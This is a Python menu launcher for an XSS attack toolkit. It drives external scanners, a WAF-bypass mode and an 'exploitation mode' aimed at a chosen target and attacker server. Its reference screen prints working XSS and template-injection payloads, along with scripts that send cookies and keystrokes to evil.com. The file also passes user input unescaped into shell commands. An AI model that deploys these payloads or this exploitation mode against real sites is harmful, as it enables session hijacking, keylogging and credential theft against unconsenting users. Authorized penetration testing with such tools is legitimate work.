#!/usr/bin/env python3
"""
XSS Attack Suite - Complete XSS Testing Framework
==================================================
Menu-based interface for comprehensive XSS testing
"""

import sys
import os
import time
from colorama import init, Fore, Style

init(autoreset=True)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    clear_screen()
    print(f"""
{Fore.CYAN}{Style.BRIGHT}
╔═══════════════════════════════════════════════════════════════════════════╗
║                                                                           ║
║   ███╗   ██╗███████╗██╗  ██╗██╗   ██╗███████╗                           ║
║   ████╗  ██║██╔════╝╚██╗██╔╝██║   ██║██╔════╝                           ║
║   ██╔██╗ ██║█████╗   ╚███╔╝ ██║   ██║███████╗                           ║
║   ██║╚██╗██║██╔══╝   ██╔██╗ ██║   ██║╚════██║                           ║
║   ██║ ╚████║███████╗██╔╝ ██╗╚██████╔╝███████║                           ║
║   ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝╚══════╝                           ║
║                                                                           ║
║   {Fore.YELLOW} XSS Attack Suite v3.0 {Fore.CYAN}                                           ║
║   {Fore.WHITE} Complete XSS Testing Framework {Fore.CYAN}                                   ║
║                                                                           ║
╚═══════════════════════════════════════════════════════════════════════════╝
{Fore.RESET}
{Fore.RED}[!] FOR AUTHORIZED TESTING ONLY - UNAUTHORIZED USE IS ILLEGAL{Fore.RESET}
""")

def show_menu():
    print(f"""
{Fore.CYAN}{'='*70}
                    MAIN MENU
{'='*70}{Fore.RESET}

  {Fore.GREEN}[1]{Fore.WHITE}  Basic XSS Scanner
  {Fore.GREEN}[2]{Fore.WHITE}  Advanced XSS Scanner (WAF Bypass)
  {Fore.GREEN}[3]{Fore.WHITE}  Framework-Specific Scanner
  {Fore.GREEN}[4]{Fore.WHITE}  DOM-Based XSS Scanner
  {Fore.GREEN}[5]{Fore.WHITE}  Payload Generator
  {Fore.GREEN}[6]{Fore.WHITE}  Batch Scanner (Multiple URLs)
  {Fore.GREEN}[7]{Fore.WHITE}  Exploitation Mode (Cookie Stealing, Keylogging)
  
  {Fore.YELLOW}[8]{Fore.WHITE}  Framework Info & Payloads Reference
  {Fore.YELLOW}[9]{Fore.WHITE}  Exit
  
{Fore.CYAN}{'='*70}{Fore.RESET}
""")

def run_basic_scanner():
    print(f"\n{Fore.CYAN}[*] Basic XSS Scanner{Fore.RESET}")
    url = input(f"{Fore.WHITE}Enter target URL: {Fore.RESET}")
    if url:
        os.system(f'python xss_tool.py -u "{url}" -s basic')

def run_advanced_scanner():
    print(f"\n{Fore.CYAN}[*] Advanced XSS Scanner (WAF Bypass){Fore.RESET}")
    url = input(f"{Fore.WHITE}Enter target URL: {Fore.RESET}")
    if url:
        os.system(f'python advanced_xss.py -u "{url}" -s full')

def run_framework_scanner():
    print(f"\n{Fore.CYAN}[*] Framework-Specific Scanner{Fore.RESET}")
    url = input(f"{Fore.WHITE}Enter target URL: {Fore.RESET}")
    framework = input(f"{Fore.WHITE}Framework (auto/php/python/java/nodejs/react/angular/vuejs): {Fore.RESET}") or 'auto'
    if url:
        os.system(f'python framework_scanner.py "{url}" {framework}')

def run_dom_scanner():
    print(f"\n{Fore.CYAN}[*] DOM-Based XSS Scanner{Fore.RESET}")
    url = input(f"{Fore.WHITE}Enter target URL: {Fore.RESET}")
    if url:
        os.system(f'python advanced_xss.py -u "{url}" --dom-xss')

def run_payload_generator():
    print(f"\n{Fore.CYAN}[*] Payload Generator{Fore.RESET}")
    os.system('python payload_generator.py')

def run_batch_scanner():
    print(f"\n{Fore.CYAN}[*] Batch Scanner{Fore.RESET}")
    filename = input(f"{Fore.WHITE}Enter targets file path: {Fore.RESET}")
    scan_type = input(f"{Fore.WHITE}Scan type (basic/advanced/full): {Fore.RESET}") or 'basic'
    if filename:
        os.system(f'python xss_tool.py -f "{filename}" -s {scan_type}')

def run_exploitation_mode():
    print(f"\n{Fore.CYAN}[*] Exploitation Mode{Fore.RESET}")
    url = input(f"{Fore.WHITE}Enter target URL: {Fore.RESET}")
    attacker = input(f"{Fore.WHITE}Enter your attacker server URL: {Fore.RESET}") or 'http://attacker.com'
    if url:
        os.system(f'python advanced_xss.py -u "{url}" -s full --exploit --attacker "{attacker}"')

def show_reference():
    clear_screen()
    C = Fore.CYAN
    Y = Fore.YELLOW
    W = Fore.WHITE
    G = Fore.GREEN
    R = Fore.RED
    B = Style.BRIGHT
    X = Style.RESET_ALL
    D = "=" * 70

    print(C + B)
    print(chr(9546) * 71)
    print("  " + B + "XSS PAYLOADS REFERENCE".center(67) + X)
    print(chr(9552) * 71)
    print(X)

    print(Y + "--- BASIC PAYLOADS " + "-" * 50 + X)
    print("  " + W + "<script>alert(1)</script>" + X)
    print("  " + W + "<script>alert(document.cookie)</script>" + X)
    print("  " + W + "<img src=x onerror=alert(1)>" + X)
    print("  " + W + "<svg onload=alert(1)>" + X)
    print("  " + W + "<body onload=alert(1)>" + X)

    print(Y + "--- ATTRIBUTE BREAKOUT " + "-" * 47 + X)
    print("  " + W + '" onmouseover="alert(1)"' + X)
    print("  " + W + "' onmouseover='alert(1)'" + X)
    print("  " + W + '" onfocus="alert(1)" autofocus="' + X)
    print("  " + W + '" onclick="alert(1)"' + X)

    print(Y + "--- JAVASCRIPT BREAKOUT " + "-" * 45 + X)
    print("  " + W + "';alert(1)//" + X)
    print("  " + W + '";alert(1)//' + X)
    print("  " + W + "';alert(1);var x='" + X)

    print(Y + "--- WAF BYPASS " + "-" * 54 + X)
    print("  " + W + "<ScRiPt>alert(1)</ScRiPt>" + X + "              (Case variation)")
    print("  " + W + "<scr<script>ipt>alert(1)</scr</script>ipt>" + X + "  (Nested tags)")
    print("  " + W + "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;" + X + " (HTML entities)")
    print("  " + W + "<script>alert&#96;1&#96;</script>" + X + "            (Backtick)")
    print("  " + W + '<script>eval(atob("YWxlcnQoMSk="))</script>' + X + " (Base64)")

    print(Y + "--- URL PROTOCOLS " + "-" * 50 + X)
    print("  " + W + "javascript:alert(1)" + X)
    print("  " + W + "data:text/html,<script>alert(1)</script>" + X)
    print("  " + W + "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" + X)

    print(Y + "--- FRAMEWORK-SPECIFIC " + "-" * 46 + X)
    print("  " + G + "PHP:" + X)
    print("    " + W + '<?php echo "<script>alert(1)</script>"; ?>' + X)
    print("    " + W + "{{config.items()}}" + X)
    print("  " + G + "Python/Django:" + X)
    print("    " + W + '"".__class__.__mro__[1].__subclasses__()' + X)
    print("    " + W + "self.__init__.__globals__" + X)
    print("  " + G + "Java:" + X)
    print("    " + W + '<%= Runtime.getRuntime().exec("calc") %>' + X)
    print("    " + W + "${7*7}" + X)
    print("  " + G + "React:" + X)
    print("    " + W + "{alert(1)}" + X)
    print("    " + W + "javascript:alert(1)" + X)
    print("  " + G + "Angular:" + X)
    print("    " + W + '{{constructor.constructor("return this")().alert(1)}}' + X)
    print("  " + G + "Vue.js:" + X)
    print("    " + W + "<svg @load=alert(1)>" + X)
    print("    " + W + "v-on:load=alert(1)" + X)

    print(Y + "--- EXPLOITATION " + "-" * 51 + X)
    print("  " + R + "Cookie Stealing:" + X)
    print("    " + W + '<script>fetch("http://evil.com/?c="+document.cookie)</script>' + X)
    print("  " + R + "Keylogging:" + X)
    print("    " + W + '<script>document.onkeypress=function(e){fetch("http://evil.com/?k="+e.key)};</script>' + X)
    print("  " + R + "Session Hijacking:" + X)
    print("    " + W + '<script>document.location="http://evil.com/?c="+document.cookie</script>' + X)

    print(C + D + X)
    input(W + "\nPress Enter to return to menu..." + X)

def main():
    while True:
        banner()
        show_menu()
        
        choice = input(f"{Fore.CYAN}Select option [1-9]: {Fore.RESET}")
        
        if choice == '1':
            run_basic_scanner()
        elif choice == '2':
            run_advanced_scanner()
        elif choice == '3':
            run_framework_scanner()
        elif choice == '4':
            run_dom_scanner()
        elif choice == '5':
            run_payload_generator()
        elif choice == '6':
            run_batch_scanner()
        elif choice == '7':
            run_exploitation_mode()
        elif choice == '8':
            show_reference()
        elif choice == '9':
            print(f"\n{Fore.GREEN}[+] Goodbye! Stay ethical!{Fore.RESET}\n")
            sys.exit(0)
        else:
            print(f"{Fore.RED}[-] Invalid option{Fore.RESET}")
        
        input(f"\n{Fore.WHITE}Press Enter to continue...{Fore.RESET}")

if __name__ == '__main__':
    main()
